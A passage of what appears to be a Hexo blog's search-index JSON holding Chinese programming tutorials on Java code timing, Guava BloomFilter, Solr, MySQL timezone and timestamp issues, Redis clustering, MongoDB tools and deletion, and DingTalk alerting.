doAround(ProceedingJoinPoint joinPoint) throws Throwable { long start = System.currentTimeMillis(); try{ return joinPoint.proceed(); } finally { System.out.println(\"cost: \" + (System.currentTimeMillis() - start)); }} Spring AOP的底层支持原理为代理模式，为目标对象提供增强功能；在Spring的生态体系下，使用aop的方式来统计方法耗时，可以说少侵入且实现简单，但是有以下几个问题 统计粒度为方法级别 类内部方法调用无法生效（详情可以参考博文：【SpringBoot 基础系列教程】AOP之高级使用技能） 2. AutoCloseable在JDK1.7引入了一个新的接口AutoCloseable, 通常它的实现类配合try{}使用，可在IO流的使用上，经常可以看到下面这种写法 1234567// 读取文件内容并输出try (Reader stream = new BufferedReader(new InputStreamReader(new FileInputStream(\"/tmp\")))) { List&lt;String&gt; list = ((BufferedReader) stream).lines().collect(Collectors.toList()); System.out.println(list);} catch (IOException e) { e.printStackTrace();} 注意上面的写法中，最值得关注一点是，不需要再主动的写stream.close了，主要原因就是在try(){}执行完毕之后，会调用方法AutoCloseable#close方法； 基于此，我们就会有一个大单的想法，下一个Cost类实现AutoCloseable接口，创建时记录一个时间，close方法中记录一个时间，并输出时间差值；将需要统计耗时的逻辑放入try(){}代码块 下面是一个具体的实现： 123456789101112131415161718192021222324252627282930public static class Cost implements AutoCloseable { private long start; public Cost() { this.start = System.currentTimeMillis(); } @Override public void close() { System.out.println(\"cost: \" + (System.currentTimeMillis() - start)); }}public static void testPrint() { for (int i = 0; i &lt; 5; i++) { System.out.println(\"now \" + i); try { Thread.sleep(10); } catch (InterruptedException e) { e.printStackTrace(); } }}public static void main(String[] args) { try (Cost c = new Cost()) { testPrint(); } System.out.println(\"------over-------\");} 执行后输出如下: 1234567now 0now 1now 2now 3now 4cost: 55------over------- 如果代码块抛异常，也会正常输出耗时么？ 12345678910111213public static void testPrint() { for (int i = 0; i &lt; 5; i++) { System.out.println(\"now \" + i); try { Thread.sleep(10); } catch (InterruptedException e) { e.printStackTrace(); } if (i == 3) { throw new RuntimeException(\"some exception!\"); } }} 再次输出如下，并没有问题 12345678now 0now 1now 2now 3cost: 46Exception in thread &quot;main&quot; java.lang.RuntimeException: some exception! at com.git.hui.boot.order.Application.testPrint(Application.java:43) at com.git.hui.boot.order.Application.main(Application.java:50) 3. 小结除了上面介绍的两种方式，还有一种在业务开发中不太常见，但是在中间件、偏基础服务的功能组件中可以看到，利用Java Agent探针技术来实现，比如阿里的arthas就是在JavaAgent的基础上做了各种上天的功能，后续介绍java探针技术时会专门介绍 下面小结一下三种统计耗时的方式 基本写法 123456long start = System.currentTimeMillis();try { // .... 具体的代码段} finally { System.out.println(\"cost: \" + (System.currentTimeMillis() - start));} 优点是简单，适用范围广泛；缺点是侵入性强，大量的重复代码 Spring AOP 在Spring生态下，可以借助AOP来拦截目标方法，统计耗时 123456789@Around(\"...\")public Object doAround(ProceedingJoinPoint joinPoint) throws Throwable { long start = System.currentTimeMillis(); try{ return joinPoint.proceed(); } finally { System.out.println(\"cost: \" + (System.currentTimeMillis() - start)); }} 优点：无侵入，适合统一管理（比如测试环境输出统计耗时，生产环境不输出）；缺点是适用范围小，且粒度为方法级别，并受限于AOP的使用范围 AutoCloseable 这种方式可以看做是第一种写法的进阶版 123456789101112131415161718// 定义类public static class Cost implements AutoCloseable { private long start; public Cost() { this.start = System.currentTimeMillis(); } @Override public void close() { System.out.println(\"cost: \" + (System.currentTimeMillis() - start)); }}// 使用姿势try (Cost c = new Cost()) { ...} 优点是：简单，适用范围广泛，且适合统一管理；缺点是依然有代码侵入 说明 上面第二种方法看着属于最优雅的方式，但是限制性强；如果有更灵活的需求，建议考虑第三种写法，在代码的简洁性和统一管理上都要优雅很多，相比较第一种可以减少大量冗余代码 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/03/200303-如何优雅的在java中统计代码块耗时/"},{"title":"200223-npm 打包溢出 FATAL ERROR Ineffective mark-compacts near heap limit Allocation failed","text":"hexo打包上传博文时，忽然报了一个致命错误，FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed 堆内存不够 一个简单的解决办法 1export NODE_OPTIONS=\"--max-old-space-size=8192\" 或者直接在.bash_profile文件中配置，并全局生效 12345678vim ~/.bash_profile# 新增，并保存退出export NODE_OPTIONS=\"--max-old-space-size=8192\"# 生效source ~/.bash_profile II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/02/23/200223-npm-打包溢出-FATAL-ERROR-Ineffective-mark-compacts-near-heap-limit-Allocation-failed/"},{"title":"200214-Guava BloomFilter 使用手册","text":"在jdk中有一个数据结构BitSet，可以用来执行位操作，比如我们常见的统计网站在线人数、pv/uv等；但是当数据样本分布不均，可能导致较大的空间浪费；其次它更适用于正整数类型的判定，针对其他的业务场景，有点薄弱 本文将介绍BloomFilter(布隆过滤器)的相关知识点，以及Guava中BloomFilter的使用姿势 I. BloomFilter1. 基本知识点什么是布隆过滤器？ 一个简单的理解，如下 首先它同样是一个m位数组 其次拥有k个独立的hash函数 每塞入一个数据，上面的所有hash函数都会计算一遍，等到一个整数值index，然后将数组中，index坐标对应的值设置为1 当判断一个数据是否存在时，只需要计算所有的hash函数的值，判断在数组中是否都是1，如果有一个不为1，那么必然不存在；如果全是1，则可能存在 上面的这个判断逻辑，核心点在于： 判定不存在，100%正确 判定存在，则不一定（可以想一想为什么？） 2. Guava 示例Guava包中提供了一个可以直接使用的BloomFilter，接下来我们简单看一下使用姿势 引入依赖 12345&lt;dependency&gt; &lt;groupId&gt;com.google.guava&lt;/groupId&gt; &lt;artifactId&gt;guava&lt;/artifactId&gt; &lt;version&gt;xxx&lt;/version&gt;&lt;/dependency&gt; api讲解 一般来讲，我们只关注BloomFilter的三个方法 12345678// 创建，请注意第二个参数表示数组长度，第三个表示错误率com.google.common.hash.BloomFilter#create(com.google.common.hash.Funnel&lt;? super T&gt;, int, double)// 添加对象com.google.common.hash.BloomFilter#put// 判断是否存在com.google.common.hash.BloomFilter#mightContain 实例 一个简单的字符串使用实例 123456789101112131415@Testpublic void testBloom() { // 初始化一个存储string数据的布隆过滤器，初始化大小1w, 错误率为0.1% BloomFilter&lt;String&gt; bloomFilter = BloomFilter.create(Funnels.stringFunnel(Charsets.UTF_8), 1000, 0.001); // 添加数据 bloomFilter.put(\"hello world!\"); // 判断是否存在，false则表示一定不存在； true表示可能存在 boolean ans = bloomFilter.mightContain(\"hello world!\"); System.out.println(ans); ans = bloomFilter.mightContain(\"hello world\"); System.out.println(ans);} 对于Guauva的BloomFilter而言，是支持普通对象的判断的，主要是借助Funnel接口来实现，下面是一个简单的case 123456789101112131415161718192021222324@Testpublic void testBloom2() { BloomFilter&lt;Map&gt; bloomFilter = BloomFilter.create(new Funnel&lt;Map&gt;() { @Override public void funnel(Map map, PrimitiveSink primitiveSink) { primitiveSink.putString(map.toString(), Charsets.UTF_8); } }, 1000, 0.001); Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); map.put(\"a\", \"b\"); bloomFilter.put(map); map.put(\"a\", \"\"); bloomFilter.put(map); // 判断是否存在，false则表示一定不存在； true表示可能存在 boolean ans = bloomFilter.mightContain(map); System.out.println(ans); map.put(\"a\", \"c\"); ans = bloomFilter.mightContain(map); System.out.println(ans);} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/02/14/200214-Guava-BloomFilter-使用手册/"},{"title":"200113-Solr 控制台实现数据的增删改查","text":"简单记录一下solr控制台的CURD的使用姿势 I. CURD在solr提供的控制台上，提供了完整的CURD的支持；然而在实际使用的时候，却不一定能很顺手，特此记录一下 我们测试的shema定义如下 1234567id: string # 默认的全局唯一字段content_id: long # 文章idtitle: string # 文章标题content: string # 文章内容type: int # 文章类型create_at: longpublish_at: long 1. 添加进入控制台，选中Collection, 点击 Documents 我们选择json的方式进行添加数据，如下图： 2. 查询solr的查询语法比较复杂，这里不展开，只演示一下基本的查询姿势如下图 3. 修改修改数据和添加的姿势基本一样，区别在于documents中，如果没有指定主键，则表示插入数据，并默认生成一个主键；如果指定了主键，且对应的主键不存在，则表示插入数据；若主键存在，则表示更新 4. 删除删除一个or多个数据时，咋一看，在控制台中好像并没有操作的入口，这里确实有必要注意一下，我们的操作界面依然是上面添加/修改的页面 请额外注意，我们选择DocumentType为xml，在doocuments中，使用&lt;delete&gt;+&lt;query&gt;标签来查询并删除 12&lt;delete&gt;&lt;query&gt;content_id:10&lt;/query&gt;&lt;/delete&gt;&lt;commit/&gt; II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/01/13/200113-Solr-控制台实现数据的增删改查/"},{"title":"200314-MySql 时区少8小时问题","text":"SpringBoot指定com.mysql.cj.jdbc.Driver来操作mysql数据库时，发现时区有八个小时的差距，主要原因在于需要在url中指定时区信息，否则会有这个问题 在使用JDBC连接Mysql5 com.mysql.jdbc.Driver时，我们一般的配置如下 1234driverClassName=com.mysql.jdbc.Driverurl=jdbc:mysql://localhost:3306/test?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=falseusername=rootpassword= 但是当driver切换成com.mysql.cj.jdbc.Driver，再使用上面的配置，就会出现时区问题，请注意，这种case下，必须指定时区，如国内 1234driverClassName=com.mysql.cj.jdbc.Driverurl=jdbc:mysql://localhost:3306/test?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=false&amp;serverTimezone=Asia/Shanghaiusername=rootpassword= II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/14/200314-MySql-时区少8小时问题/"},{"title":"191009-Python之定义函数参数、返回类型","text":"python虽然是一个弱类型的语言，在编码中，不需要特别声明参数类型，然而在实际的场景中，这种不现实指定参数类型经常会带来预期之外的问题，而且编译器还不会提示错误 如果我有一个函数，对参数类型和返回类型都有要求，可以怎么做？ 12def 函数名(参数: 参数类型...) -&gt; 返回值类型: pass 下面给出一个实际的例子，定义一个实现整数相加的函数，返回整数 12def int_add(a:int, b:int) -&gt; int: return a + b 在pycharm中实际使用时，当我们传入的参数类型不对时，会有提示，如下图 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/10/09/191009-Python之定义函数参数、返回类型/"},{"title":"190906-MySql Timestamp默认值限制问题","text":"今天在往mysql表中新增一列timestamp时，希望设置默认值为0，结果发现居然提示失败，记录一下 问题记录测试的mysql版本为 5.7.24 创建要给测试的表用来说明 123456789101112mysql&gt; show create table demo\\G*************************** 1. row *************************** Table: demoCreate Table: CREATE TABLE `demo` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `age` int(10) NOT NULL DEFAULT '0', `name` varchar(30) NOT NULL DEFAULT '', PRIMARY KEY (`id`), KEY `UNI_AGE` (`age`), KEY `name` (`name`)) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb41 row in set (0.00 sec) 我们希望在这个表里面，新增一列, 默认值为0（即对应的日期为1970-01-01 00:00:00） 12mysql&gt; alter table demo add column test_time timestamp not null default '1970-01-01 00:00:00';ERROR 1067 (42000): Invalid default value for 'test_time' 直接提示默认值非法，why? 官方说明： https://dev.mysql.com/doc/refman/5.7/en/datetime.html The TIMESTAMP data type is used for values that contain both date and time parts. TIMESTAMP has a range of ‘1970-01-01 00:00:01’ UTC to ‘2038-01-19 03:14:07’ UTC. 默认值有限制，要求必须是&gt;=1970-01-01 00:00:01 且 &lt;=2038-01-19 03:14:07 然后我们再测试一下 12mysql&gt; alter table demo add column test_time timestamp not null default '1970-01-01 00:00:01';ERROR 1067 (42000): Invalid default value for 'test_time' 依然是失败!!! why？ 注意上面说的时间是utc日期，而我们大中华是utc8 所以我们需要把时间设置为8:00:01 1234567891011121314151617mysql&gt; alter table demo add column test_time timestamp not null default '1970-01-01 08:00:01';Query OK, 0 rows affected (0.18 sec)Records: 0 Duplicates: 0 Warnings: 0mysql&gt; show create table demo\\G*************************** 1. row *************************** Table: demoCreate Table: CREATE TABLE `demo` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `age` int(10) NOT NULL DEFAULT '0', `name` varchar(30) NOT NULL DEFAULT '', `test_time` timestamp NOT NULL DEFAULT '1970-01-01 08:00:01', PRIMARY KEY (`id`), KEY `UNI_AGE` (`age`), KEY `name` (`name`)) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb41 row in set (0.01 sec) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/09/06/190906-MySql-Timestamp默认值限制问题/"},{"title":"190925-Redis集群搭建手册","text":"之前在使用redis的case中，更多的只是单机的使用；随着业务的增长，为了更好的性能提供，集群是一个必然的发展趋势；下面记录一下搭建集群的步骤 单机安装手册，可以查看： 单机redis安装手册 I. redis集群搭建过程1. 获取项目并编译首先是从官网获取最新稳定版的redis包，官网友链 -&gt; https://redis.io/ 1234567# 下载redis包wget http://download.redis.io/releases/redis-5.0.5.tar.gztar -zxvf redis-5.0.5# 开始编译makemake test 通过上面执行完毕之后，在src目录下，会生成常见的操作命令，如redis-cli redis-server 2. 开始配置在redis目录下，配置文件redis.conf是我们需要关注的目标 我们这里在本机搭建三个节点，对应的端口号分别为7000, 7001, 7002 接下来，进入配置文件，进行修改 123456789101112131415161718mkdir -p data/7000 data/7001 data/7002 log/7000 log/7001 log/7002 # 下面的配置，一次操作三遍，分别获得r7000.conf r7001.conf r7002.confcp redis.conf r7000.confvim r7000.conf## 下面是我们需要修改的地方port 7000 # 端口号pidfile /var/run/redis_7000.pid # pid进程文件# 日志和数据存储路径logfile \"/home/yihui/redis/log/7000/redis.log\"dir \"/home/yihui/redis/data/7000/\"# 后台启动daemonize yes# 开启集群cluster-enabled yes 3. 启动并设置集群上面设置完毕之后，开始启动redis 123src/redis-server r7000.confsrc/redis-server r7001.confsrc/redis-server r7002.conf 启动完毕之后，可以查看到如下的进程 到这里，集群还没有设置完成，还需要通过redis-cli设置一下集群关系 1redis/src/redis-cli --cluster create 127.0.0.1:7000 127.0.0.1:7001 127.0.0.1:7002 --cluster-replicas 1 执行上面的命名，发现并不能成功，提示如下 1234*** ERROR: Invalid configuration for cluster creation.*** Redis Cluster requires at least 3 master nodes.*** This is not possible with 3 nodes and 1 replicas per node.*** At least 6 nodes are required. 上面表示redis集群必须有三个主节点，当我们设置主从时，最少需要六个节点；当然我们在本机测试的时候，搞六个必要性不大，这里直接不要从节点 1redis/src/redis-cli --cluster create 127.0.0.1:7000 127.0.0.1:7001 127.0.0.1:7002 执行上面命令并确认之后，redis集群基本上就搭建完毕 4. 测试借助redis-cli进行集群的连接和测试 12345678910111213141516171819redis/src/redis-cli -c -p 7000127.0.0.1:7000&gt; cluster nodese1bd930c0b6f42da4af18f5aca551fd26d769330 127.0.0.1:7001@17001 master - 0 1569411511851 2 connected 5461-109227b8b9ea9feab9dc1c052c4a6215f211c25776e38 127.0.0.1:7002@17002 master - 0 1569411512853 3 connected 10923-16383d7b8d578eedf9d1148009b6930e5da6bdbd90661 127.0.0.1:7000@17000 myself,master - 0 1569411512000 1 connected 0-5460127.0.0.1:7000&gt; set test 123-&gt; Redirected to slot [6918] located at 127.0.0.1:7001OK127.0.0.1:7001&gt; set test2 1342OK127.0.0.1:7001&gt; set test3 123-&gt; Redirected to slot [13026] located at 127.0.0.1:7002OK127.0.0.1:7002&gt; set test1 123-&gt; Redirected to slot [4768] located at 127.0.0.1:7000OK127.0.0.1:7000&gt; keys *1) \"test1\"127.0.0.1:7000&gt; 通过keys命令查看，我们上面设置的几个值分布在三个实例上了 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/09/25/190925-Redis集群搭建手册/"},{"title":"200325-MongoDb系列教程三：基本工具介绍","text":"mongodb服务器安装完毕之后，提供了一些配套的操作工具，接下来我们有必要认识一下它们，并了解基本用法 0. mongod启动mongodb实例的主要命令，常见的使用姿势如下 1mongod --dbpath=/data/mongodb/data --logpath=/data/mongodb/logs --logappend --auth --port=27017 --fork 1. mongo 命令行使用mongodb安装完毕之后，会自带一个终端命令行工具，通过它可以连接mongodb，并执行相关命令 a. 连接介绍三种连接mongodb的姿势 case1 1mongo --host 目标主机 --port 端口号 -u 用户名 -p 密码 --authenticationDatabase admin case2 1mongo mongodb://root:root@127.0.0.1:27017/admin case3 上面两种姿势虽然简单，但是用户名密码有暴露的风险，推荐使用下面这种方式 1234mongo --host 目标主机 --port 端口号use admindb.auth('用户名', '密码') b. 操作连接上mongodb服务器之后，就可以执行mongo命令，查看数据库，管理文档，比如下面给几个常见的操作 1234567891011# 查看所有databaseshow dbs# 选择数据库(不存在时，创建）use basic# 显示所有集合show collections# 查看文档db.demo.findOne({}) 2. mongoimport/mongoexport用于导入导出数据，如 将库database中的集合collection导出到json文件out.json 1bin/mongoexport -h localhost:27107 -u user -p pwd -d database -c collection -o out.json 从json文件导入到目标集合new_collection 1bin/mongoimport -h localhost:27107 -u user -p pwd -d database -c new_collection ./out.json 3. mongodump/mongorestore使用mongodump命令来备份MongoDB数据, 将数据库basic的所有集合备份到目录 /tmp/outDir下 1mongodump -d basic -u root -p root --authenticationDatabase admin -o /tmp/outDir 使用mongorestore恢复，如下 12# --drop 表示先删除当前数据，然后再恢复，可以不指定mongorestore -u root -p root --authenticationDatabase admin --drop /tmp/outDir 4. mongostatemongostat是mongodb自带的状态检测工具，在命令行下使用。它会间隔固定时间获取mongodb的当前运行状态，并输出。如果你发现数据库突然变慢或者有其他问题的话，你第一手的操作就考虑采用mongostat来查看mongo的状态。 1mongostat -u root -p root --authenticationDatabase admin 5. mongotopmongotop提供每个集合的水平的统计数据，默认每s输出一次 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/25/200325-MongoDb系列教程三-基本工具介绍/"},{"title":"191225-Quick-Alarm 钉钉报警支持","text":"Quick-Alarm时隔一年半，新增钉钉报警支持，在原有的项目基础上，新增报警规则比较简单；下面介绍一下实现与使用姿势 1. 钉钉报警支持Quick-Alarm系统提供基于SPI方式进行报警方式的扩展，当我们需要新增一种报警方式时，实现接口IExecute，并注册spi文件即可 所以我们的DingdingExecute实现如下 123456789public class DingdingExecute implements IExecute { @Override public void sendMsg(List&lt;String&gt; users, String title, String msg) { for (String user : users) { DingdingPublisher.sendMessage(title, msg, user); } }} 具体的钉钉推送，抽象了一个辅助类，关于钉钉机器人的使用姿势，可以参考一下官方文档: 获取自定义机器人webhook 从官方文档中，调用钉钉机器人，实际上就是向一个特定的url，发送post请求；http请求工具这里选择了 OkHttp 这个库，具体实现代码如下 12345678910111213141516171819202122232425262728293031323334353637383940public class DingdingPublisher { private static final String TEMPLATE = \"title:\\t%s\\n\\ncontent:\\t%s\"; private static final Logger logger = LoggerFactory.getLogger(DingdingPublisher.class); private static final String DING_TALK_URL = \"https://oapi.dingtalk.com/robot/send?access_token=\"; private static final MediaType JSON; private static OkHttpClient okHttpClient; static { okHttpClient = new OkHttpClient(); JSON = MediaType.get(\"application/json; charset=utf-8\"); } public static void sendMessage(String title, String content, String token) { String msg = String.format(TEMPLATE, title, content); try { doPost(msg, token); } catch (Exception e) { logger.error(\"failed to publish msg: {} to DingDing! {}\", msg, e); } } public static String doPost(String msg, String token) throws IOException { RequestBody body = RequestBody.create(buildTextMsgBody(msg), JSON); try (Response response = okHttpClient .newCall(new Request.Builder().url(DING_TALK_URL + token).post(body).build()).execute()) { return response.body().string(); } } private static String buildTextMsgBody(String content) { JSONObject msg = new JSONObject(); msg.put(\"msgtype\", \"text\"); JSONObject text = new JSONObject(); text.put(\"content\", content); msg.put(\"text\", text); return msg.toJSONString(); }} 上面基本上就完成了一个报警器的代码实现，接下来别忘了需要注册，在资源目录下，新建文件夹 META-INF/services（注意上面是两层目录）, 添加文件com.hust.hui.alarm.core.execut.api.IExecute， 文件内容如下 1com.hust.hui.alarm.plugin.dingding.DingdingExecute 2. 测试使用使用钉钉报警时，需要先有一个自定义的钉钉机器人，可以在一个群里面申请，会获得一个token；然后将这个token 配置到我们的预警规则里面 123456789101112131415161718192021{ \"XXX,YYY\": { \"level\": \"LOG\", \"autoIncEmergency\": true, \"max\": 30, \"min\": 3, \"threshold\": [ { \"level\": \"DINGDING\", \"threshold\": 10, \"max\": 12, \"users\": [ \"请用实际的token替换!!!\" ] } ], \"users\": [ \"yihui\" ] }} 在上面的配置中，所以我们需要在users里面填写你的机器人token，这个需要额外注意； 此外新版的钉钉机器人有三种安全校验方式 关键词：需要你的报警内容中，包含对应的关键字 加签：暂时不支持这种场景，感觉意义不大 ip白名单：确保使用的机器ip在白名单内部 1234567891011121314public static void main(String[] args) throws InterruptedException { // 测试异常升级的case // 计数 [10 - 12) 钉钉报警 for (int i = 0; i &lt; 40; i++) { new Thread(new Runnable() { @Override public void run() { AlarmWrapper.getInstance().sendMsg(\"YYY\", \"异常报警升级测试\"); } }).start(); } Thread.sleep(1000 * 600);} 3. 相关信息相关博文 报警系统QuickAlarm总纲 报警系统QuickAlarm之报警执行器的设计与实现 报警系统QuickAlarm之报警规则的设定与加载 报警系统QuickAlarm之报警规则解析 报警系统QuickAlarm之频率统计及接口封装 报警系统QuickAlarm使用手册 报警系统QuickAlarm之默认报警规则扩展 项目源码 https://github.com/liuyueyi/quick-alarm II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/12/25/191225-Quick-Alarm-钉钉报警支持/"},{"title":"200326-MongoDb系列教程四：数据库 Database","text":"我们通常把mongodb叫文档型数据库，mysql叫关系型数据库，influxdb叫时序数据库，如果熟悉这三个的话，会发现他们都有一个database，它是collection/table/measurement的上一级，可以简单的把它理解为更高层级的集合，方便统一管理/权限划分/业务拆分 下面简单介绍一下database的基础操作 1. 创建数据库当数据库不存在时，通过use + 数据库命令可以用来创建数据库；当数据库存在时，表示选中 1use dbname 2. 查看数据库通过 db查看当前的数据库 通过 show dbs 查看当前的数据库列表 请注意，新创建一个数据库时，直接使用show dbs命令，并不会显示出来，如下 为了显示这个数据库，需要插入一个文档 1db.dbname.insert({\"name\": \"一灰灰blog\", \"age\": 18}) 3. 删除数据库对于数据库而言，任何删除命令都需要慎重处理，一不小心就得跑路了。。。 命令如下: db.dropDatabase() 实例说明： 一般来说我们需要删除时，两步走 1234# 选中dbuse dbname# 执行删除命令db.dropDatabase() 4. 潜规则需要注意，有三个数据库属于预留的，有特殊的作用，不能新建同名的数据 admin: 将一个用户添加到这个数据库，这个用户自动继承所有数据库的权限; 一些特定的服务器端命令也只能从这个数据库运行，比如列出所有的数据库或者关闭服务器。 local: 这个数据永远不会被复制，可以用来存储限于本地单台服务器的任意集合 config: 当Mongo用于分片设置时，config数据库在内部使用，用于保存分片的相关信息。 命名规则： 不能是空字符串 不能含有特殊字符（如，.，$, \\, /, \\0 小写 最多64字节 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/26/200326-MongoDb系列教程四-数据库-Database/"},{"title":"200326-MongoDb系列教程七：文档 Document 删除姿势","text":"前面一篇介绍了插入文档的使用姿势，这一篇则主要介绍删除的使用case 1. 基本语法1234567db.collection.remove( &lt;query&gt;, { justOne: &lt;boolean&gt;, writeConcern: &lt;document&gt; }) 第一个为需要删除的匹配条件；第二个表示是否只删除一个，默认是false，删除所有满足条件的文档 注意 当query为空时，表示删除所有文档，高危操作，谨慎执行 2. 实例演示借用给我们上一篇插入的文档来进行演示，当前存在的文档为 12345&gt; db.doc_demo.find({}){ \"_id\" : ObjectId(\"5e786582b0d677183afba746\"), \"name\" : \"yihui\", \"age\" : 18 }{ \"_id\" : ObjectId(\"5e78659ab0d677183afba747\"), \"address\" : \"China\", \"age\" : 18.8 }{ \"_id\" : ObjectId(\"5e786622b0d677183afba748\"), \"name\" : \"yihui\", \"skill\" : [ \"java\", \"python\", \"php\", \"js\" ] }{ \"_id\" : ObjectId(\"5e786680b0d677183afba749\"), \"name\" : \"yihui\", \"site\" : { \"blog\" : \"https://blog.hhui.top\", \"spring\" : \"https://spring.hhui.top\" } } 根据id进行删除 1db.doc_demo.remove({\"_id\": ObjectId(\"5e786582b0d677183afba746\")}) 根据name删除第一个满足条件的记录 1db.doc_demo.remove({\"name\":\"yihui\"}, {justOne: true}) 再次查看剩下的内容如下： II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/26/200326-MongoDb系列教程七-文档-Document-删除姿势/"},{"title":"200321-MongoDb系列教程一：基本概念","text":"mongodb和我们通常使用的关系型数据库如mysql，在一些基本概念上有相同之处，但也有一些区别，在进行mongodb的语言介绍之前，有必要先了解一些基础概念 本文将对比sql对一些基础概念进行解释说明 I. 基本概念 MongoDB 概念解析 在sql中，会区分database, table, row, column, index, primaryId；在mongodb中也有对应的概念 sql mongodb 说明 database db 数据库 table collection 表/集合 row document 行/文档 column field 字段 index index 索引 primaryId _id 主键 lock lock 锁 下面对以上基本概念进行简单说明，详情的后续博文会补上 1. 数据库数据库可以理解为collection的聚集体，每个mongodb实例可以有多个database，每个database可以有多个collection 常见的几个命令如下： 1234567891011# 显示所有dbshow dbs# 选中某个dbuse db_name# 显示当前选中的dbdb# 删除db.dropDatabase() 2. 集合document的集合，与table最大的区别是它的结构不是固定的，不需要事先定义字段、类型 首次新增document时，集合被创建； 3. document文档，也就是具体的数据；bson结构，kv方式 最大的特点是不要求所有的document的结构一致，相同的field的数据类型可以不一致 4. index索引，同样是用来提高查询效率，避免全盘扫描 5. lock支持读写锁，document加读锁时，其他读操作ok，写操作禁止；加写锁时，其他读写操作禁止 6. 事务 MongoDB 4.0 事务实现解析 版本&gt;= 4.0，支持事务，支持多文档ACID，后续详细说明 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 